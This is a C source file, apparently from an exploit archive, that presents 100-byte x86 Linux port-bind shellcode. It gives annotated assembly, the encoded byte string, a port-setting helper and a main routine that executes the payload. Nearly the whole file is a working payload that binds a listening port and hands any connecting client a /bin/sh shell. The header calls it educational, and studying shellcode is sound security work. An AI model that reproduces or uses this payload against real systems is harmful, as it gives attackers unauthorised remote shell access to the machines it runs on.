/*---------------------------------------------------------------------------*
 *                 100 byte Portbind shellcode                               *
 *              by Benjamin Orozco - benoror@gmail.com                       *
 *---------------------------------------------------------------------------*
 *    filename: x86-linux-portbind.c                                         *
 * discription: x86-linux portbind shellcode.				     *
 *		Pretty big but excellent for educational purposes.	     *
 *		Use SET_PORT() before using the shellcode. Example:	     *
 *									     *
 *			SET_PORT(sc, 31337);			             *
 *									     *
 *___________________________________________________________________________*
 *---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*
 *				ASM Code	                             *
 *---------------------------------------------------------------------------*

# s = socket(2, 1, 0)
push   $0x66			#
pop    %eax			# 0x66 = socketcall
push   $0x1			#
pop    %ebx			# socket() = 1
xor    %ecx,%ecx		#
push   %ecx			# 0
push   $0x1			# SOCK_STREAM = 1
push   $0x2			# AF_INET = 2
mov    %esp,%ecx		# Arguments
int    $0x80			# EXECUTE - Now %eax have the s fileDescriptor

# bind(s [2, 64713, 0], 0x10)
xor    %edx,%edx
push   %edx			# INADDR_ANY = 0
pushw  $0xc9fc			# PORT = 64713
pushw  $0x2			# AF_INET = 2
mov    %esp,%ecx		# %ecx holds server struct
push   $0x10			# sizeof(server) = 10
push   %ecx			# server struct
push   %eax			# s fileDescriptor
mov    %esp,%ecx
mov    %eax,%esi		# now %esi holds s fileDescriptor
push   $0x2			#
pop    %ebx			# bind() = 2
push   $0x66			#
pop    %eax			# 0x66 = socketcall
int    $0x80			# On success: %eax = 0

# listen(s, 0)
push   $0x66			#
pop    %eax			# 0x66 = socketcall
push   $0x4			#
pop    %ebx			# listen() = 4
int    $0x80			# On success: %eax = 0

# c = accept(s, 0, 0)
xor    %ecx,%ecx
push   %ecx
push   %ecx
push   %esi			# %esi = s
mov    %esp,%ecx		# Arguments
push   $0x5			#
pop    %ebx			# accept() = 5
push   $0x66			#
pop    %eax			# 0x66 = socketcall
int    $0x80			# EXECUTE - Now %eax have c fileDescriptor

# dup2(c, 2) , dup2(c, 1) , dup2(c, 0)
xchg   %eax,%ebx        	# Put c fileDescriptor on %ebx [for dup2()]
push   $0x2
pop    %ecx
dup_loop:
mov    $0x3f,%al		# dup2() = 0x3f
int    $0x80
dec    %ecx
jns    dup_loop

# execve("/bin//sh", ["/bin//sh",NULL])
mov    $0xb,%al			# execve = 11d
push   %edx
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %edx
push   %ebx
mov    %esp, %ecx
int    $0x80

*----------------------------------------------------------------------------*/

char sc[] =
"\x6a\x66"                   	//push   $0x66
"\x58"                      	//pop    %eax
"\x6a\x01"                   	//push   $0x1
"\x5b"                      	//pop    %ebx
"\x31\xc9"                   	//xor    %ecx,%ecx
"\x51"                      	//push   %ecx
"\x6a\x01"                   	//push   $0x1
"\x6a\x02"                   	//push   $0x2
"\x89\xe1"                   	//mov    %esp,%ecx
"\xcd\x80"                   	//int    $0x80
"\x31\xd2"                   	//xor    %edx,%edx
"\x52"                      	//push   %edx
"\x66\x68\xfc\xc9"             	//pushw  $0xc9fc	//PORT
"\x66\x6a\x02"                	//pushw  $0x2
"\x89\xe1"                   	//mov    %esp,%ecx
"\x6a\x10"                   	//push   $0x10
"\x51"                      	//push   %ecx
"\x50"                      	//push   %eax
"\x89\xe1"                   	//mov    %esp,%ecx
"\x89\xc6"                   	//mov    %eax,%esi
"\x6a\x02"                   	//push   $0x2
"\x5b"                      	//pop    %ebx
"\x6a\x66"                   	//push   $0x66
"\x58"                      	//pop    %eax
"\xcd\x80"                   	//int    $0x80
"\x6a\x66"                   	//push   $0x66
"\x58"                      	//pop    %eax
"\x6a\x04"                   	//push   $0x4
"\x5b"                      	//pop    %ebx
"\xcd\x80"                   	//int    $0x80
"\x31\xc9"                   	//xor    %ecx,%ecx
"\x51"                      	//push   %ecx
"\x51"                      	//push   %ecx
"\x56"                      	//push   %esi
"\x89\xe1"                   	//mov    %esp,%ecx
"\x6a\x05"                   	//push   $0x5
"\x5b"                      	//pop    %ebx
"\x6a\x66"                   	//push   $0x66
"\x58"                      	//pop    %eax
"\xcd\x80"                   	//int    $0x80
"\x93"                      	//xchg   %eax,%ebx
"\x6a\x02"                   	//push   $0x2
"\x59"                      	//pop    %ecx
"\xb0\x3f"                   	//mov    $0x3f,%al
"\xcd\x80"                   	//int    $0x80
"\x49"                      	//dec    %ecx
"\x79\xf9"                   	//jns    48 <dup_loop>
"\xb0\x0b"                   	//mov    $0xb,%al
"\x52"                      	//push   %edx
"\x68\x2f\x2f\x73\x68"          //push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"          //push   $0x6e69622f
"\x89\xe3"                   	//mov    %esp,%ebx
"\x52"                      	//push   %edx
"\x53"                      	//push   %ebx
"\x89\xe1"                   	//mov    %esp,%ecx
"\xcd\x80";                   	//int    $0x80

void SET_PORT(char *buf, int port) {
	*(unsigned short *)(((buf)+22)) = (port);
	char tmp = buf[22];
	buf[22] = buf[23];
	buf[23] = tmp;
}

main(){
	printf("size: %d bytes\n", strlen(sc));

	SET_PORT(sc, 33333);
	__asm__("call sc");
}

// milw0rm.com [2006-05-08]